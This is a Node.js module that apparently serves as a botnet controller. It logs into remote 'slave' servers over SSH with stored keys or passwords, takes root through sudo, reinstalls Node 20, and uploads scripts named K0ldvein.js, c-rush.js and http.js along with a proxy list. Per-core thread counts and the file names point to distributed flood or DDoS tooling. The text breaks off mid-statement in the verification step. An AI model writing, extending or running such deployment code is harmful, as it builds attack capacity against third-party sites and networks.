const fs       = require('node:fs');
const path     = require('node:path');
const net      = require('node:net');
const crypto   = require('node:crypto');
const { Client } = require('ssh2');

const VERSION          = '2.9.1';
const THREADS_PER_CORE = 8;
const SCRIPT_NAME      = 'K0ldvein.js';
const C_RUSH_SCRIPT    = 'c-rush.js';
const HTTP_SCRIPT      = 'http.js';
const PROXY_NAME       = 'ppp.txt';
const BOOT_TIMEOUT     = 20 * 60 * 1000;
const CONNECT_RETRIES  = 3;
const RETRY_DELAYS     = [3000, 8000, 15000];
const MIN_FREE_MB      = 200;
const CLEANUP_BELOW_MB = 250;
const HEALTH_STRIKES   = 5;
const HEALTH_SOFT      = 3;
const MAX_SAFE_CORES   = 256;
const MAX_SAFE_THREADS = MAX_SAFE_CORES * THREADS_PER_CORE;
const APT_LOCK_TIMEOUT = 600;
const NODE_MAJOR       = 20;

module.exports = function initSlaves(ctx) {
  console.log('[slaves] v' + VERSION + ' loaded');
  const { DATA_DIR, SCRIPT_DIR, audit, notifyBot } = ctx;
  const HUB_DIR      = SCRIPT_DIR || __dirname;
  const LOCAL_SCRIPT = path.join(HUB_DIR, SCRIPT_NAME);
  const LOCAL_C_RUSH = path.join(HUB_DIR, C_RUSH_SCRIPT);
  const LOCAL_HTTP   = path.join(HUB_DIR, HTTP_SCRIPT);
  const LOCAL_PROXY  = path.join(HUB_DIR, PROXY_NAME);
  const SLAVES_FILE  = path.join(DATA_DIR, 'slaves.json');
  const LOG_DIR      = path.join(DATA_DIR, 'slave-logs');

  // ── LIVE checks — re-read on every use so adding files mid-session works ──
  function hasScript()  { return fs.existsSync(LOCAL_SCRIPT); }
  function hasCRush()   { return fs.existsSync(LOCAL_C_RUSH); }
  function hasHttp()    { return fs.existsSync(LOCAL_HTTP); }
  function hasProxy()   { return fs.existsSync(LOCAL_PROXY); }

  fs.mkdirSync(LOG_DIR, { recursive: true, mode: 0o700 });

  function logHubFiles() {
    console.log('[slaves] hub files: K0ldvein=' + hasScript()
      + ' c-rush=' + hasCRush()
      + ' http=' + hasHttp()
      + ' proxy=' + hasProxy());
  }
  logHubFiles();

  let slaves = [];
  try { slaves = JSON.parse(fs.readFileSync(SLAVES_FILE, 'utf8')); } catch { slaves = []; }

  let dirty = false;
  for (const s of slaves) {
    if (s.passphrase    === undefined) { s.passphrase    = null;  dirty = true; }
    if (s._healthFails  === undefined) { s._healthFails  = 0;     dirty = true; }
    if (s.bootstrapStage === undefined){ s.bootstrapStage = null; dirty = true; }
    if (s.privMode      === undefined) { s.privMode      = null;  dirty = true; }
    if (s.status === 'bootstrapping') {
      const age = Date.now() - (s.bootstrapStartedAt || 0);
      if (!s.bootstrapStartedAt || age > BOOT_TIMEOUT) {
        s.status = 'failed';
        s.lastError = !s.bootstrapStartedAt
          ? 'Bootstrap interrupted (hub restart)'
          : 'Bootstrap timeout';
        s.bootstrapStage = null;
        delete s.bootstrapStartedAt;
        dirty = true;
      }
    }
    if (s.status === 'ready' && (!Number.isInteger(s.cores) || s.cores < 1 || s.cores > MAX_SAFE_CORES)) {
      s.status = 'failed';
      s.lastError = 'Invalid core count stored (' + s.cores + '). Click Repair.';
      s.cores = 0;
      dirty = true;
    }
  }
  if (dirty) save();

  function save() {
    const tmp = SLAVES_FILE + '.' + process.pid + '.' + Date.now() + '.tmp';
    fs.writeFileSync(tmp, JSON.stringify(slaves, null, 2) + '\n', { mode: 0o600 });
    fs.renameSync(tmp, SLAVES_FILE);
  }

  function warnMissing() {
    if (!hasScript() || !hasProxy())
      console.error('[slaves] MISSING ' + SCRIPT_NAME + ' or ' + PROXY_NAME + ' in ' + HUB_DIR);
    if (!hasCRush()) console.warn('[slaves] ' + C_RUSH_SCRIPT + ' not found in ' + HUB_DIR);
    if (!hasHttp())  console.warn('[slaves] ' + HTTP_SCRIPT  + ' not found in ' + HUB_DIR);
  }
  warnMissing();

  function logFile(id)        { return path.join(LOG_DIR, id + '.log'); }
  function logReset(slave)    { try { fs.writeFileSync(logFile(slave.id), ''); } catch {} }
  function logAppend(slave, msg) {
    const line = '[' + new Date().toISOString() + '] ' + msg + '\n';
    try { fs.appendFileSync(logFile(slave.id), line); } catch {}
    console.log('[slaves] ' + slave.name + ' ' + msg);
  }
  function logRead(id, lines) {
    try {
      const raw = fs.readFileSync(logFile(id), 'utf8');
      if (!lines) return raw;
      return raw.split('\n').slice(-lines).join('\n');
    } catch { return ''; }
  }

  function validateKey(raw, passphrase) {
    let k = String(raw || '').trim();
    if (!k) throw new Error('Private key is empty');
    if (k.startsWith('PuTTY-User-Key-File-')) throw new Error('PuTTY .ppk detected — convert to OpenSSH');
    if (/^(ssh-rsa|ssh-ed25519|ssh-dss|ecdsa-sha2-|ssh-dsa)\s/.test(k))
      throw new Error('This is a PUBLIC key — paste the PRIVATE key');
    k = k.replace(/\r\n/g, '\n').replace(/\r/g, '\n');
    const hasOpenSSH = k.includes('-----BEGIN OPENSSH PRIVATE KEY-----');
    const hasRSA     = k.includes('-----BEGIN RSA PRIVATE KEY-----');
    const hasEC      = k.includes('-----BEGIN EC PRIVATE KEY-----');
    const hasPKCS8   = k.includes('-----BEGIN PRIVATE KEY-----');
    const hasEnc     = k.includes('-----BEGIN ENCRYPTED PRIVATE KEY-----');
    const hasDSA     = k.includes('-----BEGIN DSA PRIVATE KEY-----');
    if (!(hasOpenSSH || hasRSA || hasEC || hasPKCS8 || hasEnc || hasDSA))
      throw new Error('Key format not recognized. Starts with: "' + k.slice(0, 40) + '"');
    if (hasEnc && !passphrase) throw new Error('Encrypted key — provide passphrase');
    k = k.split('\n').map(l => l.replace(/[ \t]+$/, '')).join('\n');
    if (!k.endsWith('\n')) k += '\n';
    return k;
  }

  function humaniseSshError(raw, slave) {
    const s = String(raw || 'unknown ssh error');
    if (/All configured authentication methods failed/i.test(s)) {
      if (slave.authType === 'password')
        return s + ' — server rejected the password. Check password; root login may be disabled on cloud images. Test: ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no ' + slave.username + '@' + slave.ip;
      return s + ' — server rejected the key. Verify private key matches authorized_keys on ' + slave.username + '@' + slave.ip + '.';
    }
    if (/Cannot parse privateKey|bad passphrase|integrity check failed/i.test(s))
      return s + ' — private key cannot be parsed or passphrase is wrong.';
    if (/ECONNREFUSED|EHOSTUNREACH|ENETUNREACH|EHOSTDOWN/i.test(s))
      return s + ' — cannot reach ' + slave.ip + ':' + (slave.port || 22) + '. Check firewall.';
    if (/ETIMEDOUT|Timed out/i.test(s))
      return s + ' — timeout talking to ' + slave.ip + ':' + (slave.port || 22) + '.';
    return s;
  }

  function connectOnce(slave, timeoutMs) {
    return new Promise((resolve, reject) => {
      const c = new Client();
      const cfg = {
        host: slave.ip,
        port: Number(slave.port) || 22,
        username: slave.username,
        readyTimeout: timeoutMs || 60000,
        keepaliveInterval: 10000,
        keepaliveCountMax: 6,
      };
      if (process.env.SLAVE_SSH_DEBUG === '1')
        cfg.debug = msg => console.log('[ssh2 ' + slave.name + '] ' + msg);

      let settled = false;
      const finish = (err, client) => {
        if (settled) return;
        settled = true;
        if (err) { try { c.end(); } catch {} return reject(err); }
        resolve(client || c);
      };

      if (slave.authType === 'key' && slave.privateKey) {
        try { cfg.privateKey = validateKey(slave.privateKey, slave.passphrase); }
        catch (e) { return finish(new Error('Key: ' + e.message)); }
        if (slave.passphrase) cfg.passphrase = String(slave.passphrase);
        cfg.tryKeyboard = false;
      } else if (slave.password) {
        cfg.password = String(slave.password);
        cfg.tryKeyboard = true;
        c.on('keyboard-interactive', (n, i, l, prompts, finishCb) => {
          try { finishCb(prompts.map(() => String(slave.password))); } catch {}
        });
      } else {
        return finish(new Error('No credentials configured'));
      }

      c.once('ready', () => finish(null, c));
      c.once('error', err => finish(new Error(humaniseSshError(String((err && err.message) || err || 'unknown'), slave))));
      try { c.connect(cfg); } catch (e) { finish(new Error('connect: ' + e.message)); }
    });
  }

  async function connectRetry(slave, timeoutMs) {
    let lastErr;
    for (let i = 0; i < CONNECT_RETRIES; i++) {
      try { return await connectOnce(slave, timeoutMs); }
      catch (e) {
        lastErr = e;
        const msg = String((e && e.message) || e);
        if (/authentication methods failed|Permission denied|No credentials configured|^Key: |cannot be parsed|passphrase is wrong|Cannot parse privateKey/i.test(msg)) throw e;
        if (/ECONNREFUSED|EHOSTUNREACH|ENETUNREACH|EHOSTDOWN/i.test(msg)) throw e;
        if (i < CONNECT_RETRIES - 1) {
          const d = RETRY_DELAYS[i] || 15000;
          logAppend(slave, 'connect retry ' + (i + 1) + '/' + CONNECT_RETRIES + ' in ' + (d / 1000) + 's: ' + msg);
          await new Promise(r => setTimeout(r, d));
        }
      }
    }
    throw lastErr;
  }

  function exec(conn, cmd, timeoutMs, stdin) {
    timeoutMs = timeoutMs || 60000;
    return new Promise((resolve, reject) => {
      let out = '', err = '';
      const tm = setTimeout(() => {
        try { conn.end(); } catch {}
        reject(new Error('Command timed out after ' + Math.round(timeoutMs / 1000) + 's. Last output: ' + (out.slice(-300) || '(none)')));
      }, timeoutMs);
      conn.exec(cmd, (e, stream) => {
        if (e) { clearTimeout(tm); return reject(e); }
        if (stdin != null) { try { stream.write(stdin); stream.end(); } catch {} }
        stream.on('data', d => { out += d.toString(); });
        stream.stderr.on('data', d => { err += d.toString(); });
        stream.on('close', code => { clearTimeout(tm); resolve({ code, stdout: out, stderr: err }); });
        stream.on('error', err2 => { clearTimeout(tm); reject(err2); });
      });
    });
  }

  async function detectPrivilege(conn, slave) {
    const idRes = await exec(conn, 'id -u 2>/dev/null || echo 999', 8000);
    const uid = parseInt((idRes.stdout || '').trim(), 10) || 999;
    if (uid === 0) return { mode: 'root', label: 'root (uid=0)', uid };
    const sudoCheck = await exec(conn, 'command -v sudo >/dev/null 2>&1 && echo yes || echo no', 5000);
    if (!sudoCheck.stdout.includes('yes'))
      return { mode: 'none', uid, label: 'no sudo installed', error: 'Non-root user and sudo not installed. Install sudo or connect as root.' };
    const pwless = await exec(conn, 'sudo -n true 2>/dev/null && echo __NOPASS_OK__ || echo __NOPASS_NO__', 8000);
    if (pwless.stdout.includes('__NOPASS_OK__')) return { mode: 'nopass', uid, label: 'passwordless sudo' };
    if (slave.password) {
      const cache = await sudoCache(conn, slave);
      if (cache) return { mode: 'pass', uid, label: 'password sudo (cached 15min)' };
      return { mode: 'none', uid, label: 'password sudo rejected', error: 'sudo -v rejected the SSH password for ' + slave.username + '. Verify user is in sudo group and password matches.' };
    }
    return { mode: 'none', uid, label: 'no usable privilege', error: 'Non-root user has sudo but no password provided. Add to /etc/sudoers.d/: ' + slave.username + ' ALL=(ALL) NOPASSWD:ALL' };
  }

  async function sudoCache(conn, slave) {
    if (!slave.password) return false;
    try {
      const r = await exec(conn, 'sudo -S -p "" -v 2>&1; echo "RC:$?"', 15000, slave.password + '\n');
      if (/Sorry, try again/i.test(r.stdout)) return false;
      return /RC:0/.test(r.stdout);
    } catch { return false; }
  }

  async function runPriv(conn, slave, cmd, timeoutMs) {
    if (slave.privMode === 'root') return await exec(conn, cmd, timeoutMs);
    const b64 = Buffer.from(cmd, 'utf8').toString('base64');
    const wrapped = `printf '%s' '${b64}' | base64 -d | sudo -n sh`;
    if (slave.privMode === 'nopass') return await exec(conn, wrapped, timeoutMs);
    if (slave.privMode === 'pass') {
      let r = await exec(conn, wrapped, timeoutMs);
      const combined = (r.stdout || '') + (r.stderr || '');
      if (/sudo: a password is required|sudo: no tty present/i.test(combined)) {
        logAppend(slave, 'sudo cache expired, re-authenticating');
        const ok = await sudoCache(conn, slave);
        if (!ok) throw new Error('sudo re-auth failed');
        r = await exec(conn, wrapped, timeoutMs);
      }
      return r;
    }
    throw new Error('Invalid privilege mode: ' + slave.privMode);
  }

  function sftpUpload(conn, files) {
    return new Promise((resolve, reject) => {
      conn.sftp((err, sftp) => {
        if (err) return reject(new Error('SFTP init: ' + err.message));
        const q = files.slice();
        const next = () => {
          if (!q.length) { try { sftp.end(); } catch {} return resolve(); }
          const f = q.shift();
          const size = fs.statSync(f.local).size;
          sftp.fastPut(f.local, f.remote, e => {
            if (e) { try { sftp.end(); } catch {} return reject(new Error('Upload ' + path.basename(f.local) + ': ' + e.message)); }
            sftp.stat(f.remote, (e2, st) => {
              if (e2) { try { sftp.end(); } catch {} return reject(new Error('Stat ' + f.remote + ': ' + e2.message)); }
              if (st.size !== size) { try { sftp.end(); } catch {} return reject(new Error('Size mismatch: ' + path.basename(f.local))); }
              next();
            });
          });
        };
        next();
      });
    });
  }

  async function stagePreflight(slave, conn) {
    logAppend(slave, 'preflight: probing shell + resources');
    const priv = await detectPrivilege(conn, slave);
    slave.privMode = priv.mode;
    logAppend(slave, 'preflight: privilege = ' + priv.label);
    if (priv.mode === 'none') throw new Error(priv.error);

    const lockProbe = await exec(conn,
      'if command -v fuser >/dev/null 2>&1; then PIDS=$(fuser /var/lib/dpkg/lock-frontend 2>/dev/null); ' +
      'if [ -n "$PIDS" ]; then echo "LOCKED:$PIDS"; else echo "UNLOCKED"; fi; else echo "NO_FUSER"; fi', 10000);
    if (lockProbe.stdout.includes('LOCKED:')) {
      const pids = (lockProbe.stdout.match(/LOCKED:(.+)/) || [])[1] || '';
      logAppend(slave, 'preflight: WARNING — dpkg lock held by pid(s) ' + pids.trim());
    }

    const r = await exec(conn,
      'echo "__PF_UID=$(id -u)"; echo "__PF_ARCH=$(uname -m)"; echo "__PF_CORES=$(nproc)"; ' +
      'echo "__PF_RAM=$(free -m | awk \'NR==2{print $2}\')"; ' +
      'echo "__PF_DISK=$(df -Pm / | awk \'NR==2{print $4}\')"; ' +
      'echo "__PF_DISKTOT=$(df -Pm / | awk \'NR==2{print $2}\')"; echo "__PF_END"', 25000);
    if (!r.stdout.includes('__PF_END__') && !r.stdout.includes('__PF_END'))
      throw new Error('Shell not responding. stdout=' + JSON.stringify(r.stdout.slice(0, 300)));

    const pick = tag => { const m = r.stdout.match(new RegExp('__PF_' + tag + '=([^\\n]*)')); return m ? m[1].trim() : ''; };
    const rawUid = pick('UID'), rawArch = pick('ARCH'), rawCores = pick('CORES'), rawRam = pick('RAM'), rawDisk = pick('DISK'), rawDiskTot = pick('DISKTOT');
    logAppend(slave, 'preflight raw: uid="' + rawUid + '" arch="' + rawArch + '" cores="' + rawCores + '" ram="' + rawRam + '" disk="' + rawDisk + '/' + rawDiskTot + '"');

    const uid = parseInt(rawUid, 10), coresRaw = parseInt(rawCores, 10);
    const ramMb = parseInt(rawRam, 10) || 512, diskFree = parseInt(rawDisk, 10) || 0;
    const arch = rawArch;

    if (!Number.isFinite(uid) || uid < 0) throw new Error('Cannot determine uid');
    if (!arch || !/^(x86_64|amd64|aarch64|arm64|armv7l|i686)$/.test(arch)) throw new Error('Unsupported arch: ' + arch);
    if (!Number.isInteger(coresRaw) || coresRaw < 1) throw new Error('Cannot determine CPU cores');
    if (coresRaw > MAX_SAFE_CORES) throw new Error('CPU cores suspiciously high: ' + coresRaw);

    slave.cores = coresRaw;
    logAppend(slave, 'preflight: uid=' + uid + ' arch=' + arch + ' cores=' + coresRaw + ' ram=' + ramMb + 'MB disk=' + diskFree + 'MB');

    if (diskFree < CLEANUP_BELOW_MB) {
      logAppend(slave, 'preflight: low disk — cleaning');
      await runPriv(conn, slave,
        'apt-get -o DPkg::Lock::Timeout=' + APT_LOCK_TIMEOUT + ' clean >/dev/null 2>&1 || true; ' +
        'rm -rf /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/* 2>/dev/null || true; ' +
        'journalctl --vacuum-size=50M >/dev/null 2>&1 || true; ' +
        'echo __CLEAN_DONE__', 60000);
      const r2 = await exec(conn, 'df -Pm / | awk \'NR==2{print $4}\'', 15000);
      const newFree = parseInt((r2.stdout || '').trim(), 10) || 0;
      if (newFree < MIN_FREE_MB) throw new Error('SLAVE disk low (' + newFree + 'MB free, need ' + MIN_FREE_MB + 'MB)');
    }
    return { uid, arch, cores: coresRaw, ramMb };
  }

  async function stageNode(slave, conn) {
    logAppend(slave, 'node: probing');
    const probe = await exec(conn,
      'echo "== which -a node =="; which -a node 2>/dev/null || echo "(none)"; ' +
      'echo "== versions =="; for p in $(which -a node 2>/dev/null); do printf "%s -> " "$p"; "$p" --version 2>&1 || echo "?"; done; ' +
      'echo "== /usr/bin/node =="; /usr/bin/node --version 2>/dev/null || echo "(missing)"; ' +
      'echo "== /usr/local/bin/node =="; /usr/local/bin/node --version 2>/dev/null || echo "(missing)"; ' +
      'echo "== dpkg =="; dpkg -l 2>/dev/null | grep -E "^ii.*(nodejs|libnode)" || echo "(none)"; ' +
      'echo __PROBE_END__', 25000);
    logAppend(slave, 'node: probe:\n' + (probe.stdout || '').slice(0, 2000));

    const quick = await exec(conn, 'hash -r 2>/dev/null; node --version 2>/dev/null || echo missing', 10000);
    const qm = quick.stdout.match(/v(\d+)\.(\d+)\.(\d+)/);
    if (qm && parseInt(qm[1], 10) >= NODE_MAJOR) {
      logAppend(slave, 'node: ' + qm[0] + ' already on PATH — OK');
      return qm[0];
    }

    logAppend(slave, 'node: purging apt nodejs');
    const purge = await runPriv(conn, slave,
      'export DEBIAN_FRONTEND=noninteractive; ' +
      'apt-get -o DPkg::Lock::Timeout=' + APT_LOCK_TIMEOUT + ' remove --purge -y nodejs npm libnode-dev libnode72 libnode109 nodejs-doc 2>&1 | tail -3 || true; ' +
      'apt-get -o DPkg::Lock::Timeout=' + APT_LOCK_TIMEOUT + ' autoremove -y 2>&1 | tail -2 || true; ' +
      'echo __PURGE_OK__', 240000);
    logAppend(slave, 'node: purge output: ' + (purge.stdout || '').slice(-500));
    if (!purge.stdout.includes('__PURGE_OK__'))
      throw new Error('purge failed: ' + ((purge.stderr || purge.stdout) || '').slice(-300));

    logAppend(slave, 'node: removing shadow binaries');
    const shad = await runPriv(conn, slave,
      'rm -f /usr/local/bin/node /usr/local/bin/npm /usr/local/bin/npx 2>/dev/null || true; ' +
      'rm -f /usr/bin/node /usr/bin/nodejs /usr/bin/npm /usr/bin/npx 2>/dev/null || true; ' +
      'if command -v snap >/dev/null 2>&1 && timeout 8 snap list 2>/dev/null | grep -q "^node "; then timeout 30 snap remove node >/dev/null 2>&1 || true; fi; ' +
      'hash -r 2>/dev/null || true; echo __SHADOW_OK__', 60000);
    if (!shad.stdout.includes('__SHADOW_OK__'))
      throw new Error('shadow removal failed: ' + ((shad.stderr || shad.stdout) || '').slice(-300));

    logAppend(slave, 'node: post-purge verify');
    const post = await exec(conn, 'hash -r 2>/dev/null; node --version 2>/dev/null || echo NO_NODE; /usr/bin/node --version 2>/dev/null || echo NO_USR_BIN', 10000);
    logAppend(slave, 'node: post-purge: ' + (post.stdout || '').trim().replace(/\n/g, ' | '));
    if (/v(18|17|16|19|15|14)\./.test(post.stdout)) {
      logAppend(slave, 'node: OLD node still present — deep purge');
      const deep = await runPriv(conn, slave,
        'for f in /usr/bin/node /usr/bin/nodejs /usr/local/bin/node /usr/local/bin/nodejs /opt/nodejs/bin/node /opt/node/bin/node /snap/bin/node; do ' +
          '[ -e "$f" ] && rm -f "$f" 2>/dev/null && echo "rm $f"; ' +
        'done; ' +
        'find /usr /opt -type f -name node -not -path "*/node_modules/*" 2>/dev/null | while read f; do ' +
          'v=$("$f" --version 2>/dev/null); ' +
          'case "$v" in v2[0-9].*|v[3-9][0-9].*) ;; *) rm -f "$f" 2>/dev/null && echo "rm $f ($v)";; esac; ' +
        'done; hash -r 2>/dev/null; echo __DEEP_OK__', 60000);
      logAppend(slave, 'node: deep purge: ' + (deep.stdout || '').slice(-500));
      if (!deep.stdout.includes('__DEEP_OK__'))
        throw new Error('deep purge failed: ' + ((deep.stderr || deep.stdout) || '').slice(-300));
      const post2 = await exec(conn, 'hash -r; node --version 2>/dev/null || echo NO_NODE', 10000);
      if (/v(18|17|16|19)\./.test(post2.stdout))
        throw new Error('node v18 still present after deep purge. Manual intervention required. Output: ' + (post2.stdout || '').trim());
    }

    logAppend(slave, 'node: installing prerequisites');
    const pre = await runPriv(conn, slave,
      'set -e; export DEBIAN_FRONTEND=noninteractive; ' +
      'apt-get -o DPkg::Lock::Timeout=' + APT_LOCK_TIMEOUT + ' update -qq; ' +
      'apt-get -o DPkg::Lock::Timeout=' + APT_LOCK_TIMEOUT + ' install -y -qq ' +
        '-o Dpkg::Options::=--force-confold -o Dpkg::Options::=--force-confdef ' +
        'curl ca-certificates gnupg lsb-release xz-utils; ' +
      'echo __PRE_OK__', 300000);
    if (!pre.stdout.includes('__PRE_OK__'))
      throw new Error('apt prereqs: ' + ((pre.stderr || pre.stdout) || '').slice(-400));

    logAppend(slave, 'node: staging NodeSource ' + NODE_MAJOR + '.x repo');
    const repoPrep = await exec(conn,
      'set -e; curl -fsSL https://deb.nodesource.com/gpgkey/nodesource-repo.gpg.key | gpg --dearmor > /tmp/ns.gpg; ' +
      'printf "deb [signed-by=/usr/share/keyrings/nodesource.gpg] https://deb.nodesource.com/node_' + NODE_MAJOR + '.x nodistro main\\n" > /tmp/ns.list; ' +
      'echo __PREP_OK__', 90000);
    if (!repoPrep.stdout.includes('__PREP_OK__')) {
      logAppend(slave, 'node: repo prep failed — tarball fallback');
      return await installNodeTarball(slave, conn);
    }

    const repoMove = await runPriv(conn, slave,
      'mkdir -p /etc/apt/sources.list.d /usr/share/keyrings; ' +
      'install -o root -g root -m 0644 /tmp/ns.gpg /usr/share/keyrings/nodesource.gpg && ' +
      'install -o root -g root -m 0644 /tmp/ns.list /etc/apt/sources.list.d/nodesource.list && ' +
      'rm -f /tmp/ns.gpg /tmp/ns.list && echo __MOVE_OK__', 30000);
    if (!repoMove.stdout.includes('__MOVE_OK__')) {
      logAppend(slave, 'node: repo move failed — tarball fallback');
      return await installNodeTarball(slave, conn);
    }

    logAppend(slave, 'node: apt update + policy check');
    const upd = await runPriv(conn, slave,
      'export DEBIAN_FRONTEND=noninteractive; ' +
      'apt-get -o DPkg::Lock::Timeout=' + APT_LOCK_TIMEOUT + ' update 2>&1 | tail -6; ' +
      'echo "---policy---"; apt-cache policy nodejs 2>/dev/null | head -12; echo __UPD_OK__', 180000);
    logAppend(slave, 'node: update:\n' + (upd.stdout || '').slice(0, 800));

    const cand = (upd.stdout.match(/Candidate:\s*(\S+)/) || [])[1] || '';
    if (!/^20\./.test(cand)) {
      logAppend(slave, 'node: apt candidate "' + (cand || '(none)') + '" is not 20.x — going tarball');
      return await installNodeTarball(slave, conn);
    }
    logAppend(slave, 'node: apt candidate = ' + cand + ' (NodeSource 20.x confirmed)');

    logAppend(slave, 'node: apt install nodejs');
    const inst = await runPriv(conn, slave,
      'set -e; export DEBIAN_FRONTEND=noninteractive; ' +
      'apt-get -o DPkg::Lock::Timeout=' + APT_LOCK_TIMEOUT + ' install -y ' +
        '-o Dpkg::Options::=--force-confold -o Dpkg::Options::=--force-confdef nodejs 2>&1 | tail -10; ' +
      'echo "===VERIFY==="; ' +
      'echo "USR_BIN:$(/usr/bin/node --version 2>/dev/null || echo MISSING)"; ' +
      'echo "PATH_NODE:$(hash -r; node --version 2>/dev/null || echo MISSING)"; ' +
      'echo __INST_OK__', 420000);
    logAppend(slave, 'node: install:\n' + (inst.stdout || '').slice(0, 1000));

    const usrBin = (inst.stdout.match(/USR_BIN:(v[\d.]+)/) || [])[1] || '';
    const pathV  = (inst.stdout.match(/PATH_NODE:(v[\d.]+)/) || [])[1] || '';
    const usrBinOk = /^v(2[0-9]|[3-9][0-9])\./.test(usrBin);
    const pathOk   = /^v(2[0-9]|[3-9][0-9])\./.test(pathV);

    if (usrBinOk && pathOk) { logAppend(slave, 'node: installed ' + pathV + ' via apt — OK'); return pathV; }
    if (usrBinOk && !pathOk) {
      logAppend(slave, 'node: /usr/bin is ' + usrBin + ' but PATH is ' + (pathV || 'missing') + ' — relinking');
      await runPriv(conn, slave,
        'ln -sf /usr/bin/node /usr/local/bin/node; ln -sf /usr/bin/npm /usr/local/bin/npm 2>/dev/null || true; ' +
        'hash -r 2>/dev/null; echo __LINK_OK__', 15000);
      const v = await exec(conn, 'hash -r; node --version 2>/dev/null || echo missing', 10000);
      const vm = v.stdout.match(/v(\d+\.\d+\.\d+)/);
      if (vm && parseInt(vm[1].split('.')[0], 10) >= NODE_MAJOR) { logAppend(slave, 'node: ' + vm[0] + ' — OK'); return vm[0]; }
    }
    logAppend(slave, 'node: apt path did not yield v20 — tarball fallback');
    return await installNodeTarball(slave, conn);
  }

  async function installNodeTarball(slave, conn) {
    logAppend(slave, 'node-tarball: resolving version');
    const archRes = await exec(conn, 'uname -m', 10000);
    const rawArch = (archRes.stdout || '').trim();
    let archName;
    if (/x86_64|amd64/.test(rawArch))    archName = 'x64';
    else if (/aarch64|arm64/.test(rawArch)) archName = 'arm64';
    else if (/armv7l/.test(rawArch))     archName = 'armv7l';
    else throw new Error('Unsupported arch for tarball: ' + rawArch);
    logAppend(slave, 'node-tarball: arch=' + rawArch + ' -> ' + archName);

    const idx = await exec(conn,
      'curl -fsSL --max-time 20 https://nodejs.org/dist/latest-v' + NODE_MAJOR + '.x/SHASUMS256.txt 2>/dev/null | head -50 || true', 30000);
    const anyVer = (idx.stdout || '').match(/node-(v(\d+\.\d+\.\d+))-linux-/);
    if (!anyVer || parseInt(anyVer[2].split('.')[0], 10) !== NODE_MAJOR)
      throw new Error('Cannot resolve latest v' + NODE_MAJOR + ' — nodejs.org unreachable from slave. Raw: ' + (idx.stdout || '').slice(0, 200));
    const ver = 'v' + anyVer[2];
    logAppend(slave, 'node-tarball: target ' + ver);

    const dest    = '/usr/local/lib/node20';
    const tarball = '/tmp/node-' + ver + '-linux-' + archName + '.tar.xz';
    const url     = 'https://nodejs.org/dist/' + ver + '/node-' + ver + '-linux-' + archName + '.tar.xz';

    logAppend(slave, 'node-tarball: downloading');
    const dl = await exec(conn, 'curl -fsSL --max-time 180 -o ' + tarball + ' ' + url + ' && echo __DL_OK__', 220000);
    if (!dl.stdout.includes('__DL_OK__')) throw new Error('download failed: ' + ((dl.stderr || dl.stdout) || '').slice(-400));

    logAppend(slave, 'node-tarball: extracting to ' + dest);
    const ext = await runPriv(conn, slave,
      'set -e; rm -rf ' + dest + '; mkdir -p /usr/local/lib; ' +
      'tar -xJf ' + tarball + ' -C /usr/local/lib; ' +
      'mv /usr/local/lib/node-' + ver + '-linux-' + archName + ' ' + dest + '; ' +
      'ln -sf ' + dest + '/bin/node /usr/local/bin/node; ' +
      'ln -sf ' + dest + '/bin/npm  /usr/local/bin/npm; ' +
      'ln -sf ' + dest + '/bin/npx  /usr/local/bin/npx; ' +
      'rm -f ' + tarball + '; ' +
      'echo "LINKED:$(/usr/local/bin/node --version 2>&1)"; echo __EXT_OK__', 180000);
    logAppend(slave, 'node-tarball: extract:\n' + (ext.stdout || '').slice(0, 800));
    if (!ext.stdout.includes('__EXT_OK__'))
      throw new Error('extract failed: ' + ((ext.stderr || ext.stdout) || '').slice(-400));

    logAppend(slave, 'node-tarball: force-removing non-20 node binaries');
    await runPriv(conn, slave,
      'for f in /usr/bin/node /usr/bin/nodejs /opt/nodejs/bin/node /opt/node/bin/node; do ' +
        '[ -e "$f" ] && [ ! -L "$f" ] && rm -f "$f" 2>/dev/null && echo "rm $f"; ' +
      'done; hash -r 2>/dev/null; echo __CLEAN_OK__', 30000);

    logAppend(slave, 'node-tarball: final verify');
    const vf = await exec(conn, 'hash -r; node --version 2>/dev/null || /usr/local/bin/node --version 2>/dev/null || echo missing', 15000);
    const vm = (vf.stdout || '').match(/v(\d+\.\d+\.\d+)/);
    if (!vm || parseInt(vm[1].split('.')[0], 10) < NODE_MAJOR) {
      const list = await exec(conn,
        'find /usr /opt /snap -type f -name node -not -path "*/node_modules/*" 2>/dev/null | while read f; do printf "%s -> " "$f"; "$f" --version 2>/dev/null || echo "?"; done', 30000);
      throw new Error('Tarball install did not yield v' + NODE_MAJOR + '+. Found: ' + (list.stdout || '(none)').slice(0, 500));
    }
    logAppend(slave, 'node-tarball: installed ' + vm[0] + ' — OK');
    return vm[0];
  }

  // ── THE FIX: file list built fresh at call time ──────────────────────────
  function buildFileList(remoteDir) {
    const files = [
      { local: LOCAL_SCRIPT, remote: remoteDir + '/' + SCRIPT_NAME },
      { local: LOCAL_PROXY,  remote: remoteDir + '/' + PROXY_NAME  },
    ];
    if (hasCRush()) files.push({ local: LOCAL_C_RUSH, remote: remoteDir + '/' + C_RUSH_SCRIPT });
    if (hasHttp())  files.push({ local: LOCAL_HTTP,  remote: remoteDir + '/' + HTTP_SCRIPT  });
    return files;
  }

  async function stageUpload(slave, conn, uid) {
    logAppend(slave, 'upload: preparing dir');
    const home = uid === 0 ? '/root' : ((await exec(conn, 'echo $HOME', 10000)).stdout.trim() || '/tmp');
    const remoteDir = home + '/koldvein';
    const mk = await exec(conn,
      'rm -rf ' + remoteDir + ' && mkdir -p ' + remoteDir + ' && cd ' + remoteDir + ' && test -w . && echo __WRITABLE__', 20000);
    if (!mk.stdout.includes('__WRITABLE__')) throw new Error('Cannot create ' + remoteDir);

    // log what we're shipping
    logAppend(slave, 'upload: http.js present on hub = ' + hasHttp() + ', c-rush.js present = ' + hasCRush());

    const files = buildFileList(remoteDir);
    logAppend(slave, 'upload: ' + files.length + ' file(s): ' + files.map(f => path.basename(f.local)).join(', '));
    await sftpUpload(conn, files);
    logAppend(slave, 'upload: done');
    return remoteDir;
  }

  async function stageVerify(slave, conn, remoteDir) {
    logAppend(slave, 'verify: files + syntax');
    const filesList = [SCRIPT_NAME, PROXY_NAME]
      .concat(hasCRush() ? [C_RUSH_SCRIPT] : [])
      .concat(hasHttp()  ? [HTTP_SCRIPT]   : []);
    const missingCheck = filesList.map(f => 'test -s ' + f).join(' && ') + ' || { echo __MISSING__; exit 1; }';
    const syntaxChecks = ['node --check ' + SCRIPT_NAME]
